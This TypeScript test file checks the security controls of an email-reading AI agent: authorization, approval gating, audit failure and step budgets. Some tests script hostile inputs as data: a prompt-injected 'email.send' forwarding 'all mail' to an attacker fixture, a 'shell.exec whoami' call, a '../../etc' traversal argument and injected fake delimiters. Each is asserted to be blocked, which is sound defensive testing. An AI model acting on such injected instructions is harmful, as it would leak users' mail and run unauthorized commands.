import { describe, expect, it } from "vitest";
import { z } from "zod";
import type { DecisionKind, LLMRequest, ToolName } from "@contracts";
import { createAgent } from "@/lib/agent";
import { createMockProvider, mockAction, mockScripts, type MockScript } from "@/providers";
import { createEmailReadTools, createToolbox, defineTool } from "@/tools";
import { createSecurityDouble, testPolicy } from "../doubles/security-double";
import { ATTACKER, testMailbox } from "../doubles/fixtures";

/** A side-effect tool that records calls, standing in for email.send until it exists. */
function recordingSendTool(sent: unknown[]) {
  return defineTool({
    name: "email.send",
    description: "Send an email (test recorder).",
    sensitivity: "external_send",
    producesUntrustedContent: false,
    inputSchema: z.strictObject({ to: z.array(z.email()).min(1).max(5), subject: z.string().max(200), body: z.string().max(5000) }),
    timeoutMs: 1_000,
    async run(args) {
      sent.push(args);
      return { segments: [{ source: "tool", origin: null, text: "Email queued." }], summary: "sent" };
    },
  });
}

function setup(opts: {
  script: MockScript;
  decisions?: Partial<Record<ToolName, DecisionKind>>;
  failAuditOnAppend?: number;
  limits?: Parameters<typeof testPolicy>[0];
  maxInvalidOutputRetries?: number;
}) {
  const security = createSecurityDouble({ decisions: opts.decisions, failAuditOnAppend: opts.failAuditOnAppend });
  const sent: unknown[] = [];
  const mailbox = testMailbox();
  const { registry, executor } = createToolbox([...createEmailReadTools(() => mailbox), recordingSendTool(sent)], {
    authority: security.authority,
    hashArgs: security.hashArgs,
    audit: security.audit,
  });
  const requests: LLMRequest[] = [];
  const script: MockScript = (ctx) => {
    requests.push(ctx.request);
    return opts.script(ctx);
  };
  const agent = createAgent({
    provider: createMockProvider(script),
    engine: security.engine,
    authority: security.authority,
    approvals: security.approvals,
    audit: security.audit,
    registry,
    executor,
    policy: testPolicy(opts.limits),
    settings: { maxInvalidOutputRetries: opts.maxInvalidOutputRetries ?? 1 },
  });
  const types = () => security.events.map((e) => e.type);
  return { agent, security, sent, requests, types };
}

const READS = { "email.list": "allow", "email.read": "allow" } as const;

describe("agent milestone: simple legitimate task", () => {
  it("summarizes the inbox using email.list and returns a final answer", async () => {
    const { agent, security, requests, types } = setup({
      decisions: READS,
      script: mockScripts.scripted([
        mockAction.toolCalls({ tool: "email.list", args: { unreadOnly: true } }),
        mockAction.final("You have 2 unread emails: Alice asks to move lunch; one looks like phishing."),
      ]),
    });

    const res = await agent.runTurn({ message: "Summarize my unread emails" });

    expect(res.error).toBeNull();
    expect(res.status).toBe("completed");
    expect(res.assistantText).toContain("2 unread");
    expect(agent.getSession(res.sessionId)).toMatchObject({ tainted: true, toolCallCount: 1 });

    // Second model call saw the tool result inside a nonce-delimited, untrusted data block.
    const toolMsg = requests[1].messages.find((m) => m.content.startsWith("Tool result for email.list"));
    expect(toolMsg?.role).toBe("user");
    expect(toolMsg?.content).toMatch(/<data-[0-9a-f]{16} source="email" origin="msg-2"/);
    // The injected fake delimiters were neutralized.
    expect(toolMsg?.content).not.toContain("</data-abc>");

    expect(security.calls.authorize).toBe(1);
    expect(security.calls.verify).toBe(1);
    expect(types()).toEqual([
      "session_started",
      "user_message",
      "tool_proposed",
      "authz_decision",
      "tool_executed",
      "content_ingested",
      "content_ingested",
      "turn_completed",
    ]);
  });

  it("system prompt carries tool JSON schemas and no configuration", async () => {
    const { agent, requests } = setup({ decisions: READS, script: mockScripts.scripted([mockAction.final("hi")]) });
    await agent.runTurn({ message: "hello" });
    const system = requests[0].messages[0];
    expect(system.role).toBe("system");
    expect(system.content).toContain("email.list");
    expect(system.content).toContain('"additionalProperties":false');
    expect(system.content).not.toMatch(/API_KEY|OPENAI|GEMINI/);
  });
});

describe("agent security behaviour", () => {
  it("denied injected send never executes and the model gets a fixed notice", async () => {
    const { agent, sent, requests, types } = setup({
      decisions: { ...READS, "email.send": "deny" },
      script: mockScripts.scripted([
        mockAction.toolCalls({ tool: "email.read", args: { messageId: "msg-2" } }),
        mockAction.toolCalls({ tool: "email.send", args: { to: [ATTACKER], subject: "fwd", body: "all mail" } }),
        mockAction.final("Done."),
      ]),
    });
    const res = await agent.runTurn({ message: "Read the urgent email" });
    expect(res.status).toBe("completed");
    expect(sent).toEqual([]);
    const notice = requests[2].messages.at(-1)!.content;
    expect(notice).toContain("[system notice] Tool call email.send was denied by security policy (R-TEST-DOUBLE)");
    expect(notice).not.toContain(ATTACKER);
    expect(types().filter((t) => t === "tool_executed")).toHaveLength(1);
  });

  it("unknown tool from the model is sent to the engine and denied", async () => {
    const { agent, security, types } = setup({
      script: mockScripts.scripted([mockAction.toolCalls({ tool: "shell.exec", args: { cmd: "whoami" } }), mockAction.final("ok")]),
    });
    await agent.runTurn({ message: "hi" });
    expect(security.calls.authorize).toBe(1);
    expect(security.calls.issue).toBe(0);
    expect(types()).not.toContain("tool_executed");
  });

  it("args that fail the tool schema are denied, not executed", async () => {
    const { agent, security } = setup({
      decisions: READS,
      script: mockScripts.scripted([mockAction.toolCalls({ tool: "email.read", args: { messageId: "../../etc", extra: 1 } }), mockAction.final("ok")]),
    });
    await agent.runTurn({ message: "read" });
    expect(security.calls.issue).toBe(0);
  });

  it("require_approval pauses, drops the rest of the step, and runs exactly once after approval", async () => {
    const { agent, sent, security, types } = setup({
      decisions: { ...READS, "email.send": "require_approval" },
      script: mockScripts.scripted([
        mockAction.toolCalls(
          { tool: "email.send", args: { to: ["alice@example.test"], subject: "Re: Lunch", body: "1pm works" } },
          { tool: "email.list", args: {} },
        ),
        mockAction.final("Replied to Alice."),
      ]),
    });

    const paused = await agent.runTurn({ message: "Reply to alice@example.test that 1pm works" });
    expect(paused.status).toBe("awaiting_approval");
    expect(paused.pendingApproval?.tool).toBe("email.send");
    expect(sent).toEqual([]);
    expect(types().filter((t) => t === "tool_executed")).toHaveLength(0);

    // New messages are refused while an approval is pending.
    const blocked = await agent.runTurn({ sessionId: paused.sessionId, message: "hurry" });
    expect(blocked.error?.code).toBe("AWAITING_APPROVAL");

    const done = await agent.resumeAfterApproval(paused.pendingApproval!.id, "approve");
    expect(done.status).toBe("completed");
    expect(sent).toHaveLength(1);
    expect(security.approvals.get(paused.pendingApproval!.id)?.status).toBe("consumed");

    // The same approval cannot be used again.
    const again = await agent.resumeAfterApproval(paused.pendingApproval!.id, "approve");
    expect(again.error?.code).toBe("APPROVAL_NOT_PENDING");
    expect(sent).toHaveLength(1);
  });

  it("rejected approval never executes", async () => {
    const { agent, sent, requests } = setup({
      decisions: { "email.send": "require_approval" },
      script: mockScripts.scripted([
        mockAction.toolCalls({ tool: "email.send", args: { to: ["alice@example.test"], subject: "x", body: "y" } }),
        mockAction.final("Not sent."),
      ]),
    });
    const paused = await agent.runTurn({ message: "email alice@example.test" });
    const res = await agent.resumeAfterApproval(paused.pendingApproval!.id, "reject");
    expect(res.status).toBe("completed");
    expect(sent).toEqual([]);
    expect(requests[1].messages.at(-1)!.content).toContain("operator rejected the email.send call");
  });
});

describe("agent fail-safe behaviour", () => {
  it("provider error ends the turn and nothing further runs", async () => {
    const { agent, types } = setup({
      decisions: READS,
      script: mockScripts.failAfter([mockAction.toolCalls({ tool: "email.list", args: {} })], "UNAVAILABLE"),
    });
    const res = await agent.runTurn({ message: "summarize" });
    expect(res.status).toBe("error");
    expect(res.error?.code).toBe("PROVIDER_UNAVAILABLE");
    expect(types().filter((t) => t === "tool_executed")).toHaveLength(1);
    expect(types().at(-1)).toBe("provider_error");
  });

  it("invalid model output is retried once with a correction, then fails without executing", async () => {
    const { agent, security, requests, types } = setup({ decisions: READS, script: mockScripts.garbage() });
    const res = await agent.runTurn({ message: "summarize" });
    expect(res.error?.code).toBe("MODEL_OUTPUT_INVALID");
    expect(requests).toHaveLength(2);
    expect(security.calls.authorize).toBe(0);
    expect(types().filter((t) => t === "model_output_invalid")).toHaveLength(2);
  });

  it("stops at the step budget", async () => {
    const { agent, types } = setup({
      decisions: READS,
      limits: { maxSteps: 3 },
      script: () => mockAction.toolCalls({ tool: "email.list", args: {} }),
    });
    const res = await agent.runTurn({ message: "loop forever" });
    expect(res.status).toBe("completed");
    expect(res.assistantText).toContain("step limit");
    expect(types().filter((t) => t === "tool_executed")).toHaveLength(3);
    expect(types().at(-1)).toBe("budget_exceeded");
  });

  it("audit failure stops the session permanently", async () => {
    const { agent, sent } = setup({
      decisions: { "email.send": "allow" },
      failAuditOnAppend: 3, // session_started, user_message succeed; tool_proposed fails
      script: () => mockAction.toolCalls({ tool: "email.send", args: { to: ["a@b.test"], subject: "s", body: "b" } }),
    });
    const res = await agent.runTurn({ message: "send" });
    expect(res.error?.code).toBe("AUDIT_FAILURE");
    expect(sent).toEqual([]);
    const next = await agent.runTurn({ sessionId: res.sessionId, message: "again" });
    expect(next.error?.code).toBe("SESSION_FAILED");
  });

  it("rejects concurrent turns on one session", async () => {
    let release!: () => void;
    const gate = new Promise<void>((r) => (release = r));
    let calls = 0;
    const security = createSecurityDouble();
    const { registry, executor } = createToolbox([], { authority: security.authority, hashArgs: security.hashArgs, audit: security.audit });
    const agent = createAgent({
      provider: {
        id: "mock",
        model: "slow",
        async generate() {
          if (calls++ > 0) await gate; // first turn is instant, second waits
          return { provider: "mock", model: "slow", text: mockAction.final("done") };
        },
      },
      engine: security.engine,
      authority: security.authority,
      approvals: security.approvals,
      audit: security.audit,
      registry,
      executor,
      policy: testPolicy(),
    });
    const first = await agent.runTurn({ message: "one" });
    const slow = agent.runTurn({ sessionId: first.sessionId, message: "two" });
    const busy = await agent.runTurn({ sessionId: first.sessionId, message: "three" });
    expect(busy.error?.code).toBe("SESSION_BUSY");
    release();
    expect((await slow).status).toBe("completed");
  });

  it("validates the user message", async () => {
    const { agent } = setup({ script: mockScripts.scripted([]) });
    expect((await agent.runTurn({ message: "" })).error?.code).toBe("INVALID_MESSAGE");
    expect((await agent.runTurn({ message: "x".repeat(4001) })).error?.code).toBe("INVALID_MESSAGE");
    expect((await agent.runTurn({ sessionId: "nope", message: "hi" })).error?.code).toBe("SESSION_NOT_FOUND");
  });
});
